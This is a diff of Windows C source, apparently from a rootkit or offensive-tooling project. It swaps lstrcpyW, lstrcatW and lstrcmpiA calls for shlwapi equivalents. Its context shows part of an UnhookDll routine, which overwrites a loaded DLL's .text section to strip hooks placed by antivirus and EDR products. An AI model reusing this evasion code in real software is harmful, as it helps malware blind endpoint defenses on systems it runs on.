@@ -154,7 +154,7 @@ BOOL GetProcessFileName(DWORD processId, BOOL fullPath, LPWSTR fileName, DWORD f
 			PWCHAR resultFileName = fullPath ? path : PathFindFileNameW(path);
 			if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
 			{
-				lstrcpyW(fileName, resultFileName);
+				StrCpyW(fileName, resultFileName);
 				result = TRUE;
 			}
 		}
@@ -253,7 +253,7 @@ BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength)
 		PWCHAR resultFileName = &path[4];
 		if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
 		{
-			lstrcpyW(fileName, resultFileName);
+			StrCpyW(fileName, resultFileName);
 			result = TRUE;
 		}
 	}
@@ -336,8 +336,8 @@ BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resul
 		WCHAR fileName[MAX_PATH + 1];
 		if (GetRandomString(fileName, 8))
 		{
-			lstrcatW(fileName, L".");
-			lstrcatW(fileName, extension);
+			StrCatW(fileName, L".");
+			StrCatW(fileName, extension);
 
 			if (PathCombineW(resultPath, tempPath, fileName) && WriteFileContent(resultPath, file, fileSize))
 			{
@@ -829,10 +829,10 @@ VOID UnhookDll(LPCWSTR name)
 	if (name)
 	{
 		WCHAR path[MAX_PATH + 1];
-		if (Is64BitOperatingSystem() && BITNESS(32)) lstrcpyW(path, L"C:\\Windows\\SysWOW64\\");
-		else lstrcpyW(path, L"C:\\Windows\\System32\\");
+		if (Is64BitOperatingSystem() && BITNESS(32)) StrCpyW(path, L"C:\\Windows\\SysWOW64\\");
+		else StrCpyW(path, L"C:\\Windows\\System32\\");
 
-		lstrcatW(path, name);
+		StrCatW(path, name);
 
 		// Get original DLL handle. This DLL is possibly hooked by AV/EDR solutions.
 		HMODULE dll = GetModuleHandleW(name);
@@ -861,7 +861,7 @@ VOID UnhookDll(LPCWSTR name)
 								PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER));
 
 								// Find the .text section of the hooked DLL and overwrite it with the original DLL section
-								if (!lstrcmpiA((LPCSTR)sectionHeader->Name, ".text"))
+								if (!StrCmpIA((LPCSTR)sectionHeader->Name, ".text"))
 								{
 									LPVOID virtualAddress = (LPVOID)((ULONG_PTR)moduleInfo.lpBaseOfDll + (ULONG_PTR)sectionHeader->VirtualAddress);
 									DWORD virtualSize = sectionHeader->Misc.VirtualSize;
